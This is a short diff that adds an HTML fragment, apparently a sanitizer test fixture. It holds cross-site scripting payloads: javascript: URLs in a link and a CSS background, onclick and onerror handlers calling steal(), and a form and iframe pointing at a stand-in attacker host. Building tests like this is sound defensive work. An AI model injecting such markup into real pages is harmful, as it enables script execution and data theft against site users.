@@ -1,0 +1,8 @@
+<div>
+  <form action="https://attacker.example/post"><button>Submit</button></form>
+  <iframe src="https://attacker.example/frame"></iframe>
+  <p style="color: green; position:absolute; background-image: url(javascript:alert(1));">Safe text</p>
+  <a href="javascript:alert(1)">Bad link</a>
+  <a href="https://example.com/safe" onclick="steal()">Safe link</a>
+  <img src="x" onerror="steal()" alt="bad image">
+</div>
